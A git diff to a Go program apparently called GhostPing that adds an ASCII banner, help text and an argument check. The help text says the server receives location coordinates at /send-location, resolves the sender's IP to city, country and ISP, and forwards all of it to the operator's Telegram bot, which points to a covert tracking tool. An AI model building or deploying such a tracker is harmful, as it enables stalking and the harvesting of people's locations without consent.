@@ -46,12 +46,34 @@ func init() {
 }
 
 func usage() {
-	fmt.Println("Usage: go-server [options]")
+	fmt.Println("\033[32m" + `
+ @@@@@@@@  @@@  @@@   @@@@@@    @@@@@@   @@@@@@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@  
+@@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@  
+!@@        @@!  @@@  @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@!@!@@@  !@@        
+!@!        !@!  @!@  !@!  @!@  !@!         !@!    !@!  @!@  !@!  !@!!@!@!  !@!        
+!@! @!@!@  @!@!@!@!  @!@  !@!  !!@@!!      @!!    @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
+!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!     !!!    !!@!!!    !!!  !@!  !!!  !!! !!@!!  
+:!!   !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!:  !!:  !!!  :!!   !!:  
+:!:   !::  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  :!:  !:!  :!:   !::  
+ ::: ::::  ::   :::  ::::: ::  :::: ::      ::     ::        ::   ::   ::   ::: ::::  
+ :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :   
+                                                                                      
+       by k4rkarov (v1.0)
+` + "\033[0m")
+	fmt.Println("")
+	fmt.Println("Usage: ghostping [options]")
+	fmt.Println("")
 	fmt.Println("Options:")
 	fmt.Println("  -token <TOKEN>   Telegram bot token (required)")
 	fmt.Println("  -chat <CHAT_ID>  Telegram chat ID (required)")
 	fmt.Println("  -port <PORT>     Port to run the server (default: 8088)")
 	fmt.Println("  -h, --help       Show this help message")
+	fmt.Println("")
+	fmt.Println("Description:")
+	fmt.Println("	GhostPing listens for POST requests on /send-location.")
+	fmt.Println("	It extracts latitude and longitude from the JSON body,")
+	fmt.Println("	resolves the client’s IP into city/country/ISP details,")
+	fmt.Println("	then pushes a formatted message to your Telegram bot.")
 }
 
 func getIP(r *http.Request) string {
@@ -137,7 +159,7 @@ Longitude: %s
 📡 *ISP:* %s
 
 🔗 %s
-`, 
+`,
 		emptyIf(loc.Latitude, "Not provided"),
 		emptyIf(loc.Longitude, "Not provided"),
 		ip,
@@ -173,6 +195,13 @@ func emptyIf(val string, def string) string {
 func main() {
 	flag.Parse()
 
+	// Se nenhum parâmetro for passado
+	if len(os.Args) == 1 {
+		fmt.Println("\033[31mError: no parameters provided\033[0m")
+		fmt.Println("Please check: ghostping -h/--help")
+		os.Exit(1)
+	}
+
 	if help {
 		usage()
 		os.Exit(0)
@@ -192,4 +221,3 @@ func main() {
 		log.Fatalf("Server failed: %v", err)
 	}
 }
-
